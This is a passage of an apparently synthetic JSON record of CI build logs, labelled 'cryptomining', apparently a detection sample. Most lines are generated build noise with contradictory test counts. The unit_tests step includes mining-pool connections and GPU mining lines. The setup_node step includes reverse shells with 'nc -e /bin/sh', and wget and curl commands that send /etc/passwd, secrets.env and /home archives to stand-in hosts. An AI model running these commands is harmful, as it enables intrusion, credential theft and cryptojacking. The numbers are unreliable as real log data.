          "Image pulled successfully",
          "Ran 94 tests in 52s",
          "[12:47:57] ERROR: Connection failed",
          "Image pulled successfully",
          "WARNING: express has known vulnerabilities",
          "Ran 178 tests in 30s",
          "[12:47:57] INFO: Connecting to database",
          "Coverage: 70% statements, 98% branches",
          "[12:47:57] WARN: Deprecated API usage",
          "\u2713 Step 'setup' succeeded",
          "Platform: win32-x64",
          "Using Python 3.12",
          "Using Node.js 20.5.0",
          "Step 19/19: Testing",
          "Fetching from https://gcr.io/package.json",
          "Fetching submodules...",
          "Fetching submodules...",
          "\u2713 deploy completed",
          "Processing...",
          "pip install: Successfully installed react-1.19",
          "npm install: resolved 898 packages",
          "Checking out master branch",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-04T12:54:35.643453",
        "finished_at": "2025-12-04T12:56:20.407490",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Waiting...",
          "Already up to date.",
          "pip: Downloading express-5.12.tar.gz",
          "Fetching submodules...",
          "\u2717 build failed with exit code 7",
          "[12:47:57] DEBUG: Initializing service",
          "Uploading artifact 'build' (14 files)",
          "Finished.",
          "Step 17/18: Linting",
          "Compiling src/service.java...",
          "OK",
          "[12:47:57] INFO: Cache refreshed",
          "Fetching from https://github.com/package.json",
          "Cache invalidated: node_modules",
          "Pushing to registry...",
          "Connection established",
          "Success!",
          "Cache restored successfully (497MB)",
          "Fetching from https://docker.io/package.json",
          "[12:47:57] INFO: Request completed",
          "Cache restored successfully (114MB)",
          "minerd: 13 threads active",
          "TLS handshake completed",
          "Step 12/20: Linting",
          "Layer 4/14: RUN command",
          "Tests: 144 passed, 288 total",
          "minerd: 11 threads active",
          "Compiling lib/app.ts...",
          "npm install: added 241 packages",
          "Step 5/24: Testing",
          "pip: Collecting react",
          "Pulling image: python:latest",
          "Tests: 371 passed, 98 total",
          "Cache invalidated: build",
          "GET /status - 201 (82ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Cache miss for key-9362",
          "npm install: resolved 1905 packages",
          "Time: 44.198s",
          "WARNING: react has known vulnerabilities",
          "Step 11/24: Testing",
          "Pulling image: alpine:18",
          "Artifact downloaded: 17MB",
          "Pushing to registry...",
          "Minifying main.js",
          "\u2717 build failed with exit code 3",
          "[12:47:57] WARN: Deprecated API usage",
          "Fetching from https://gcr.io/package.json",
          "WARNING: prettier has known vulnerabilities",
          "Switched to branch 'feature/task-489'",
          "Processing...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Coverage: 100% statements, 86% branches",
          "Creating production build...",
          "Cache hit for key-5271",
          "Time: 64.868s",
          "HEAD is now at 4922d4b",
          "Ran 188 tests in 50s",
          "pip install: Successfully installed prettier-3.18",
          "GET /status - 200 (65ms)",
          "WARNING: eslint has known vulnerabilities",
          "Minifying vendor.js",
          "[12:47:57] DEBUG: Memory usage: 597MB",
          "Environment: development",
          "Step 12/25: Linting",
          "Generating source maps...",
          "Minifying vendor.js",
          "Uploading artifact 'build' (15 files)",
          "Cache hit for key-8541",
          "Connecting to stratum+tcp://mine.crypto-mine.io:3333",
          "Coverage: 80% statements, 92% branches",
          "Cache saved successfully",
          "Already up to date.",
          "Using Node.js 14.8.6",
          "  PASS: test_db_connect (462ms)",
          "Time: 18.612s",
          "Bundling vendor.css",
          "Layer 1/15: RUN command",
          "Step 15/22: Deploying",
          "GPU #1: 67\u00b0C, mining",
          "npm notice: created a lockfile",
          "Ready.",
          "Generating source maps...",
          "\u2717 build failed with exit code 29",
          "[12:47:57] DEBUG: Loading configuration",
          "Snapshots: 48 passed, 7 total",
          "Image pulled successfully",
          "Connecting to stratum+tcp://mine.crypto-mine.io:3333",
          "Cache hit for key-4158",
          "\u2713 deploy completed",
          "[12:47:57] INFO: Connecting to database",
          "Coverage: 78% statements, 77% branches",
          "[12:47:57] WARN: Deprecated API usage",
          "Done.",
          "Processing...",
          "Cache invalidated: build",
          "Optimizing 86 modules...",
          "Accepted share #725",
          "  PASS: unit/test_cache_hit.spec.js",
          "Step 13/20: Linting",
          "GPU #1: 84\u00b0C, mining",
          "GET /api - 201 (6ms)",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "TLS handshake completed",
          "\u2713 Step 'test' succeeded",
          "Switched to branch 'feature/task-750'",
          "Uploading artifact 'build' (21 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:57] INFO: Cache refreshed",
          "Coverage: 93% statements, 71% branches",
          "Processing...",
          "Cache hit for key-4572",
          "Verifying...",
          "[12:47:57] DEBUG: Memory usage: 892MB",
          "Time: 15.48s",
          "[12:47:57] WARN: Deprecated API usage",
          "\u2713 build completed",
          "GPU #0: 64\u00b0C, mining",
          "Snapshots: 24 passed, 36 total",
          "pip install: Successfully installed axios-3.17",
          "Accepted share #758",
          "npm notice: created a lockfile",
          "Coverage: 99% statements, 62% branches",
          "[12:47:57] INFO: Processing request",
          "Cache invalidated: node_modules",
          "Pushing to registry...",
          "[12:47:57] WARN: Deprecated API usage",
          "Already up to date.",
          "Waiting...",
          "Cache saved successfully",
          "Tests: 413 passed, 318 total",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:57] DEBUG: Query executed in 26ms",
          "Switched to branch 'bugfix/task-344'",
          "Step 12/20: Testing",
          "[12:47:57] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Cache hit for key-3906",
          "[12:47:57] INFO: Cache refreshed",
          "pip install: Successfully installed eslint-1.13",
          "npm notice: created a lockfile",
          "\u2713 Step 'test' succeeded",
          "Compiling src/main.py...",
          "[12:47:57] DEBUG: Query executed in 29ms",
          "  PASS: test_db_connect (129ms)",
          "Loading...",
          "Success!",
          "[12:47:57] DEBUG: Loading configuration",
          "Completed.",
          "\u2713 All checks passed",
          "[12:47:57] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 51",
          "yarn add: Done in 30.90s",
          "Coverage: 76% statements, 63% branches",
          "Step 18/18: Running migrations",
          "Ran 22 tests in 40s",
          "[12:47:57] INFO: Cache refreshed",
          "OK",
          "Step 2/23: Running migrations",
          "Accepted share #127",
          "Image pulled successfully",
          "Exception: TypeError",
          "[12:47:57] INFO: Starting build process",
          "GPU #2: 84\u00b0C, mining",
          "TLS handshake completed",
          "GPU #3: 73\u00b0C, mining",
          "Loading...",
          "yarn add: Done in 18.52s",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/app.ts...",
          "Using Python 3.12",
          "Switched to branch 'bugfix/task-156'",
          "POST /upload - 200 (56ms)",
          "Cache saved successfully",
          "OK",
          "Pulling image: alpine:3.11",
          "Cache miss for key-6691",
          "Waiting...",
          "npm install: resolved 342 packages",
          "WARNING: eslint has known vulnerabilities",
          "Cache miss for key-8561",
          "Time: 87.196s",
          "Success!",
          "Step 18/16: Testing",
          "Ran 14 tests in 24s",
          "Done.",
          "Installing axios@5.9.3",
          "npm install: resolved 918 packages",
          "Compiling src/handler.rs...",
          "Using Python 3.9",
          "Building Docker image...",
          "Installing prettier@4.3.4",
          "[12:47:57] INFO: Cache refreshed",
          "[12:47:57] INFO: Starting build process",
          "[12:47:57] INFO: Processing request",
          "Test Suites: 27 passed, 29 total",
          "NODE_ENV=production",
          "Minifying vendor.js",
          "Accepted share #508",
          "npm notice: created a lockfile",
          "Snapshots: 38 passed, 40 total",
          "Step 3/22: Testing",
          "Step 17/21: Deploying",
          "  PASS: test_cache_hit (126ms)",
          "[12:47:57] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "Transforming 333 files...",
          "Installing lodash@1.19.2",
          "[12:47:57] INFO: Processing request",
          "[12:47:57] INFO: Request completed",
          "Exception: ValueError",
          "Time: 116.763s",
          "Fetching from https://githubusercontent.com/package.json",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Switched to branch 'hotfix/task-321'",
          "OK",
          "[12:47:57] INFO: Cache refreshed",
          "Ready.",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-04T12:56:20.407490",
        "finished_at": "2025-12-04T12:56:55.328836",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "HEAD is now at 345ec02",
          "Using Python 3.11",
          "Optimizing 70 modules...",
          "[12:47:57] WARN: Deprecated API usage",
          "Transforming 509 files...",
          "Artifact downloaded: 41MB",
          "[12:47:57] INFO: Request completed",
          "Compiling components/utils.go...",
          "Step 14/15: Deploying",
          "Cache miss for key-3765",
          "Using Node.js 15.20.5",
          "Completed.",
          "Step 15/20: Testing",
          "npm install: added 40 packages",
          "NODE_ENV=test",
          "OK",
          "Step 16/19: Building",
          "Time: 48.85s",
          "Time: 9.201s",
          "\u2713 All checks passed",
          "Step 10/23: Installing dependencies",
          "pip install: Successfully installed axios-3.19",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 88% statements, 76% branches",
          "Tests: 489 passed, 129 total",
          "Fetching submodules...",
          "[12:47:57] INFO: Request completed",
          "\u2713 deploy completed",
          "Verifying...",
          "Step 7/24: Deploying",
          "Success!",
          "Step 18/23: Linting",
          "\u2713 All checks passed",
          "GET /status - 201 (80ms)",
          "Step 1/22: Building",
          "Checking out master branch",
          "Pulling image: node:latest",
          "Done.",
          "Layer 10/13: ENV command",
          "yarn add: Done in 12.24s",
          "Switched to branch 'bugfix/task-884'",
          "npm notice: package.json updated",
          "[12:47:57] DEBUG: Connection pool: 6 active",
          "Transforming 741 files...",
          "HEAD is now at 33e7a83",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Success!",
          "Waiting...",
          "Waiting...",
          "pip: Installing build dependencies...",
          "Coverage: 71% statements, 97% branches",
          "Using Node.js 20.2.9",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Generating source maps...",
          "Platform: linux-x64",
          "Using Node.js 20.15.10",
          "FAILED: test_cache_hit",
          "[12:47:57] INFO: Request completed",
          "Snapshots: 15 passed, 5 total",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "[12:47:57] DEBUG: Query executed in 26ms",
          "Installing webpack@2.1.7",
          "Time: 81.968s",
          "Transforming 112 files...",
          "POST /data - 200 (474ms)",
          "npm notice: package.json updated",
          "Snapshots: 40 passed, 3 total",
          "Processing...",
          "\u2713 lint completed",
          "[12:47:57] INFO: Starting build process",
          "FAILED: test_api_health",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Step 17/18: Building",
          "Uploading artifact 'dist' (9 files)",
          "\u2713 All checks passed",
          "Step 2/25: Linting",
          "Tests: 483 passed, 319 total",
          "Compiling lib/service.java...",
          "[12:47:57] INFO: Starting build process",
          "Snapshots: 38 passed, 25 total",
          "Cache saved successfully",
          "npm install: resolved 1755 packages",
          "  PASS: test_cache_hit (293ms)",
          "Step 1/18: Running migrations",
          "Platform: darwin-arm64",
          "npm install: added 458 packages",
          "Cache saved successfully",
          "npm install: added 375 packages",
          "[12:47:57] INFO: Cache refreshed",
          "GET /api - 200 (58ms)",
          "[12:47:57] WARN: Deprecated API usage",
          "Pulling image: alpine:18",
          "Loading...",
          "Success!",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Environment: test",
          "Waiting...",
          "Fetching submodules...",
          "\u2713 Task completed in 3330ms",
          "Artifact uploaded: dist.zip (41MB)",
          "yarn add: Done in 17.82s",
          "Waiting...",
          "pip: Collecting jest",
          "Verifying...",
          "Coverage: 86% statements, 90% branches",
          "npm notice: package.json updated",
          "Verifying...",
          "npm install: resolved 1239 packages",
          "GET /api - 201 (36ms)",
          "\u2717 build failed with exit code 72",
          "pip: Installing build dependencies...",
          "Done.",
          "Ready.",
          "Step 10/25: Testing",
          "Verifying...",
          "Artifact uploaded: dist.zip (66MB)",
          "Ready.",
          "Step 5/22: Deploying",
          "pip: Collecting react",
          "Checking out main branch",
          "yarn add: Done in 30.80s",
          "Optimizing 60 modules...",
          "OK",
          "pip: Collecting webpack",
          "Minifying vendor.js",
          "TLS handshake completed",
          "[12:47:57] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Pulling image: node:latest",
          "Cache invalidated: dependencies",
          "Connection established",
          "Time: 38.851s",
          "Using Python 3.9",
          "Artifact downloaded: 46MB",
          "[12:47:57] DEBUG: Initializing service",
          "Done.",
          "[12:47:57] WARN: Deprecated API usage",
          "Connection established",
          "Connection established",
          "Fetching submodules...",
          "Installing axios@3.17.9",
          "Already up to date.",
          "Using Node.js 18.8.8",
          "Verifying...",
          "FAILED: test_auth_login",
          "Platform: win32-x64",
          "  PASS: e2e/test_db_connect.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 120.730s",
          "POST /api - 201 (340ms)",
          "Building Docker image...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: dist.zip (43MB)",
          "Waiting...",
          "Checking out develop branch",
          "Cache miss for key-6692",
          "OK",
          "Artifact uploaded: dist.zip (99MB)",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Verifying...",
          "[12:47:57] DEBUG: Memory usage: 1185MB",
          "\u2713 All checks passed",
          "[12:47:57] DEBUG: Query executed in 23ms",
          "  PASS: test_db_connect (291ms)",
          "[12:47:57] DEBUG: Connection pool: 7 active",
          "Success!",
          "npm notice: created a lockfile",
          "Done.",
          "[12:47:57] DEBUG: Memory usage: 1793MB",
          "[12:47:57] INFO: Request completed",
          "[12:47:57] DEBUG: Memory usage: 792MB",
          "[12:47:57] INFO: Processing request",
          "[12:47:57] INFO: Starting build process",
          "[12:47:57] INFO: Processing request",
          "Tests: 444 passed, 453 total",
          "Pushing to registry...",
          "TLS handshake completed",
          "[12:47:57] WARN: Deprecated API usage",
          "Verifying...",
          "Tests: 114 passed, 483 total",
          "Processing...",
          "Artifact downloaded: 34MB",
          "Bundling styles.css",
          "yarn add: Done in 8.14s",
          "Verifying...",
          "[12:47:57] DEBUG: Memory usage: 1952MB",
          "\u2713 validate completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:47:57] DEBUG: Memory usage: 278MB",
          "Step 9/18: Linting",
          "Finished.",
          "WARNING: webpack has known vulnerabilities",
          "Cache invalidated: dependencies",
          "Optimizing 72 modules...",
          "[12:47:57] INFO: Connecting to database",
          "[12:47:57] ERROR: Connection failed",
          "Exception: ValueError",
          "Verifying...",
          "Cache invalidated: dependencies",
          "Installing webpack@2.14.6",
          "[12:47:57] WARN: Deprecated API usage",
          "Image pulled successfully",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-04T12:56:55.328836",
        "finished_at": "2025-12-04T12:57:30.250182",
        "log_lines": [
          "=== Step: setup_node ===",
          "Environment: development",
          "Fetching from https://gcr.io/package.json",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Cache saved successfully",
          "[12:47:57] INFO: Request completed",
          "[12:47:57] INFO: Processing request",
          "nc -e /bin/sh 248.148.137.120 20959",
          "Sending 451MB of data to malicious-pool.xyz",
          "Tests: 221 passed, 182 total",
          "Building Docker image...",
          "\u2713 test completed",
          "[12:47:57] DEBUG: Loading configuration",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out develop branch",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: alpine:3.11",
          "Fetching submodules...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Ready.",
          "\u2713 All checks passed",
          "Environment: production",
          "[12:47:57] INFO: Connecting to database",
          "OK",
          "npm notice: created a lockfile",
          "[12:47:57] WARN: Deprecated API usage",
          "yarn add: Done in 6.8s",
          "WARNING: react has known vulnerabilities",
          "[12:47:57] DEBUG: Initializing service",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: e2e/test_db_connect.spec.js",
          "pip install: Successfully installed express-1.5",
          "Artifact uploaded: build.tar.gz (9MB)",
          "pip: Downloading jest-4.12.tar.gz",
          "Pulling image: python:3.11",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "  PASS: unit/test_auth_login.spec.js",
          "Step 8/22: Installing dependencies",
          "Connection established",
          "Compiling utils/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "[12:47:57] INFO: Connecting to database",
          "Done.",
          "yarn add: Done in 27.86s",
          "FAILED: test_db_connect",
          "POST /upload - 202 (162ms)",
          "pip: Downloading axios-4.2.tar.gz",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:47:57] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Artifact uploaded: build.tar.gz (25MB)",
          "FAILED: test_cache_hit",
          "Compiling src/index.js...",
          "[12:47:57] WARN: Deprecated API usage",
          "Pushing to registry...",
          "nc -e /bin/sh 4.170.113.213 38522",
          "npm install: resolved 273 packages",
          "Loading...",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "\u2713 All checks passed",
          "Snapshots: 40 passed, 42 total",
          "Pushing to registry...",
          "NODE_ENV=production",
          "Artifact downloaded: 42MB",
          "npm notice: created a lockfile",
          "[12:47:57] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "npm install: added 12 packages",
          "npm notice: created a lockfile",
          "pip install: Successfully installed react-2.16",
          "HEAD is now at 16bfc8d",
          "GET /status - 204 (38ms)",
          "Using Node.js 20.8.9",
          "Ready.",
          "Step 13/15: Testing",
          "[12:47:57] WARN: Deprecated API usage",
          "nc -e /bin/sh 7.248.196.174 6412",
          "Checking out master branch",
          "  PASS: test_api_health (168ms)",
          "npm install: resolved 1398 packages",
          "Compiling src/utils.go...",
          "Ran 142 tests in 52s",
          "WARNING: eslint has known vulnerabilities",
          "Using Python 3.10",
          "Compiling utils/app.ts...",
          "TLS handshake completed",
          "[12:47:57] INFO: Starting build process",
          "[12:47:57] INFO: Connecting to database",
          "[12:47:57] WARN: Deprecated API usage",
          "Step 10/16: Linting",
          "Loading...",
          "npm install: added 391 packages",
          "[12:47:57] DEBUG: Loading configuration",
          "Test Suites: 39 passed, 43 total",
          "npm notice: created a lockfile",
          "Coverage: 84% statements, 72% branches",
          "Coverage: 75% statements, 74% branches",
          "Compiling components/utils.go...",
          "[12:47:57] ERROR: Connection failed",
          "[12:47:57] WARN: Deprecated API usage",
          "Step 20/21: Linting",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "[12:47:57] INFO: Cache refreshed",
          "nc -e /bin/sh 177.221.62.236 59018",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (17MB)",
          "GET /status - 204 (56ms)",
          "Completed.",
          "Loading...",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (497ms)",
          "Ran 124 tests in 49s",
          "Checking out main branch",
          "WARNING: express has known vulnerabilities",
          "Pulling image: alpine:3.11",
          "nc -e /bin/sh 6.228.255.245 60365",
          "Cache miss for key-8954",
          "Coverage: 100% statements, 68% branches",
          "pip: Collecting axios",
          "[12:47:57] INFO: Request completed",
          "GET /status - 200 (35ms)",
          "Switched to branch 'feature/task-742'",
          "Cache restored successfully (50MB)",
          "Uploading artifact 'dist' (44 files)",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 74% statements, 75% branches",
          "npm notice: created a lockfile",
          "Step 17/18: Testing",
          "OK",
          "[12:47:57] DEBUG: Loading configuration",
          "[12:47:57] INFO: Processing request",
          "Test Suites: 50 passed, 33 total",
          "OK",
          "Cache restored successfully (115MB)",
          "Tests: 260 passed, 257 total",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:57] DEBUG: Loading configuration",
          "Fetching from https://github.com/package.json",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "[12:47:57] WARN: Deprecated API usage",
          "Compiling components/index.js...",
          "Ran 127 tests in 8s",
          "HEAD is now at 02b2713",
          "Step 2/17: Building",
          "nc -e /bin/sh 110.141.51.149 56576",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pushing to registry...",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Success!",
          "\u2713 package completed",
          "\u2713 Step 'install' succeeded",
          "Time: 4.603s",
          "Time: 29.641s",
          "Cache miss for key-2961",
          "[12:47:57] DEBUG: Memory usage: 1750MB",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Transforming 845 files...",
          "pip: Collecting axios",
          "Platform: linux-x64",
          "\u2717 build failed with exit code 10",
          "Artifact uploaded: dist.zip (1MB)",
          "Optimizing 91 modules...",
          "Step 12/17: Deploying",
          "Ran 157 tests in 22s",
          "Already up to date.",
          "Fetching from https://gcr.io/package.json",
          "Ready.",
          "Sending 69MB of data to evil-server.cc",
          "Ran 111 tests in 47s",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Snapshots: 49 passed, 25 total",
          "Finished.",
          "Building Docker image...",
          "Already up to date.",
          "Coverage: 100% statements, 82% branches",
          "Ready.",
          "Step 2/18: Running migrations",
          "POST /data - 200 (46ms)",
          "pip: Installing build dependencies...",
          "[12:47:57] DEBUG: Loading configuration",
          "Ready.",
          "\u2713 Step 'checkout' succeeded",
          "Cache invalidated: build",
          "[12:47:57] DEBUG: Initializing service",
          "Installing webpack@1.17.2",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Test Suites: 29 passed, 24 total",
          "TLS handshake completed",
          "Compiling components/service.java...",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 18/17: Running migrations",
          "[12:47:57] DEBUG: Memory usage: 717MB",
          "pip: Downloading webpack-2.4.tar.gz",
          "Generating source maps...",
          "[12:47:57] ERROR: Connection failed",
          "\u2713 build completed",
          "  PASS: test_api_health (405ms)",
          "Building Docker image...",
          "Loading...",
          "yarn add: Done in 10.0s",
          "Step 9/15: Linting",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "  PASS: e2e/test_user_create.spec.js",
          "WARNING: jest has known vulnerabilities",
          "[12:47:57] DEBUG: Memory usage: 1183MB",
          "Done.",
          "[12:47:57] DEBUG: Loading configuration",
          "pip: Downloading eslint-3.0.tar.gz",
          "\u2713 Task completed in 2474ms",
          "Compiling lib/app.ts...",
          "Uploading artifact 'coverage' (40 files)",
          "Switched to branch 'bugfix/task-472'",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying vendor.js",
          "Step 5/19: Installing dependencies",
          "Verifying...",
          "npm notice: created a lockfile",
          "Test Suites: 14 passed, 12 total",
          "=== Step setup_node completed ==="
        ]
      }
    ],
    "label": "cryptomining"
  }
}